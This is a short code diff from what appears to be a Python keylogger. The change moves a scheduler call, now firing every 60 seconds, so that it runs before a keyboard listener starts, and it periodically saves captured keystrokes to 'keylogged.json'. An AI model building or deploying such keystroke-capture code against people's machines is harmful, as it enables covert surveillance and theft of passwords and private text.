@@ -95,13 +95,12 @@ def main():
       json.dump(dict_obj, f)
 
   keylogs = open_file('keylogged.json')
+  scheduler(60, save_file, (keylogs, 'keylogged.json'))
 
   with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
     listener.join()
   
   
-
-  scheduler(10, save_file, (keylogs, 'keylogged.json'))
   
 
 
